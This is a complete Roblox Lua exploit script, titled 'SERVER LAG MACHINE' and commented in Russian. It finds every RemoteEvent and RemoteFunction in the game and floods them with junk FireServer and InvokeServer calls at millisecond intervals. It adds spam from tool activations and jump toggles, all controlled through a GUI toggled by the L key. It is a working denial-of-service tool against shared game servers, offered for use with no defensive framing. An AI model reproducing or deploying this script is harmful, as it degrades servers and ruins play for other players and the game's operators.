-- SERVER LAG MACHINE
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LagEnabled = false
local requestCount = 0

-- Создаем GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ServerLagGUI"
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0, 400, 0, 20)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 40)
header.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
header.BorderSizePixel = 0
header.Parent = mainFrame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 1, 0)
title.Position = UDim2.new(0, 15, 0, 0)
title.Text = "SERVER LAG MACHINE"
title.TextColor3 = Color3.fromRGB(220, 220, 220)
title.BackgroundTransparency = 1
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "×"
closeBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
closeBtn.BorderSizePixel = 0
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = header

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeBtn

-- Content
local content = Instance.new("Frame")
content.Size = UDim2.new(1, -20, 1, -60)
content.Position = UDim2.new(0, 10, 0, 50)
content.BackgroundTransparency = 1
content.Parent = mainFrame

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 25)
statusLabel.Text = "Status: DISABLED (Press L)"
statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
statusLabel.BackgroundTransparency = 1
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = content

-- Info
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0, 60)
infoLabel.Position = UDim2.new(0, 0, 0, 30)
infoLabel.Text = "💥 Spams server with requests\n🎮 Press L to toggle\n📡 Creates server-side lag\n⚠️ May get you kicked"
infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
infoLabel.BackgroundTransparency = 1
infoLabel.TextSize = 11
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextXAlignment = Enum.TextXAlignment.Center
infoLabel.TextWrapped = true
infoLabel.Parent = content

-- ФУНКЦИОНАЛЬНОСТЬ

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Перетаскивание
local dragging = false
local dragStart, startPos

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

header.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- Переключение по клавише L
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.L then
        LagEnabled = not LagEnabled
        
        if LagEnabled then
            statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
            statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
            print("💥 SERVER LAG ACTIVATED!")
        else
            statusLabel.Text = "Status: DISABLED (Press L)"
            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            print("🛑 Server lag stopped. Total requests: " .. requestCount)
        end
    end
end)

-- НАХОДИМ ВСЕ REMOTE EVENTS И FUNCTIONS ДЛЯ СПАМА
local foundRemotes = {}

local function findAndHookRemotes()
    -- Ищем в ReplicatedStorage
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not foundRemotes[obj] then
            table.insert(foundRemotes, obj)
            print("📡 Found remote: " .. obj:GetFullName())
        end
    end
    
    -- Ищем в других важных местах
    local importantLocations = {
        game:GetService("Workspace"),
        game:GetService("Lighting"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        game:GetService("StarterGui")
    }
    
    for _, location in pairs(importantLocations) do
        for _, obj in pairs(location:GetDescendants()) do
            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not foundRemotes[obj] then
                table.insert(foundRemotes, obj)
                print("📡 Found remote: " .. obj:GetFullName())
            end
        end
    end
    
    print("🎯 Total remotes found: " .. #foundRemotes)
end

-- Запускаем поиск
findAndHookRemotes()

-- СИСТЕМА СПАМА ЗАПРОСАМИ НА СЕРВЕР
local spamActive = false

local function spamServerRequests()
    if not LagEnabled or spamActive or #foundRemotes == 0 then return end
    
    spamActive = true
    local cycleCount = 0
    
    print("🚀 STARTING SERVER REQUEST SPAM...")
    
    while LagEnabled do
        cycleCount = cycleCount + 1
        
        -- СПАМ ВСЕМИ НАЙДЕННЫМИ REMOTE ОБЪЕКТАМИ
        for i, remote in pairs(foundRemotes) do
            if LagEnabled then
                -- Для RemoteEvent
                if remote:IsA("RemoteEvent") then
                    pcall(function()
                        remote:FireServer(
                            "LAG_REQUEST_" .. requestCount,
                            math.random(1, 1000000),
                            {data = "SERVER_LAG_SPAM", count = requestCount},
                            Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
                            true,
                            false,
                            "EXTREME_LAG"
                        )
                        requestCount = requestCount + 1
                    end)
                end
                
                -- Для RemoteFunction
                if remote:IsA("RemoteFunction") then
                    pcall(function()
                        remote:InvokeServer(
                            "LAG_INVOKE_" .. requestCount,
                            {lag = true, spam = true, count = requestCount},
                            math.random()
                        )
                        requestCount = requestCount + 1
                    end)
                end
                
                -- Обновляем GUI
                statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
                
                -- Очень короткая задержка между запросами
                wait(0.001)
            end
        end
        
        -- ДОПОЛНИТЕЛЬНЫЙ ИНТЕНСИВНЫЙ СПАМ
        for i = 1, 50 do
            if LagEnabled and #foundRemotes > 0 then
                local randomRemote = foundRemotes[math.random(1, #foundRemotes)]
                pcall(function()
                    if randomRemote:IsA("RemoteEvent") then
                        randomRemote:FireServer("QUICK_SPAM_" .. i, math.random())
                    else
                        randomRemote:InvokeServer("QUICK_SPAM_" .. i, math.random())
                    end
                    requestCount = requestCount + 1
                end)
            end
            wait(0.0001)
        end
        
        -- Выводим статистику
        if cycleCount % 10 == 0 then
            print("💥 SERVER SPAM CYCLE #" .. cycleCount .. " - Requests: " .. requestCount)
            statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
        end
        
        wait(0.01) -- Пауза между циклами
    end
    
    spamActive = false
    print("🛑 SERVER REQUEST SPAM STOPPED")
end

-- ДОПОЛНИТЕЛЬНЫЙ СПАМ ЧЕРЕЗ ИГРОВЫЕ СИСТЕМЫ
local extraSpamActive = false

local function extraSpamSystems()
    if not LagEnabled or extraSpamActive then return end
    
    extraSpamActive = true
    
    while LagEnabled do
        -- Спамим через различные игровые системы
        pcall(function()
            -- Попытка использовать инструменты
            local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
            if backpack then
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Activate()
                        requestCount = requestCount + 1
                    end
                end
            end
        end)
        
        -- Спамим изменениями свойств
        pcall(function()
            if LocalPlayer.Character then
                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Jump = not humanoid.Jump
                    requestCount = requestCount + 1
                end
            end
        end)
        
        wait(0.05)
    end
    
    extraSpamActive = false
end

-- Запускаем системы спама
spawn(function()
    while true do
        if LagEnabled and not spamActive then
            spamServerRequests()
        end
        wait(0.1)
    end
end)

spawn(function()
    while true do
        if LagEnabled and not extraSpamActive then
            extraSpamSystems()
        end
        wait(0.1)
    end
end)

-- Поиск новых Remote объектов
spawn(function()
    while true do
        if LagEnabled then
            findAndHookRemotes()
        end
        wait(5) -- Ищем новые Remote каждые 5 секунд
    end
end)

print("💥💥💥 SERVER LAG MACHINE LOADED!")
print("🎮 Press L to start/stop server lag")
print("📡 Spamming all found RemoteEvents/Functions")
print("⚠️ WARNING: This may get you kicked from the game!")
print("🚀 Starting with " .. #foundRemotes .. " remote objects found")
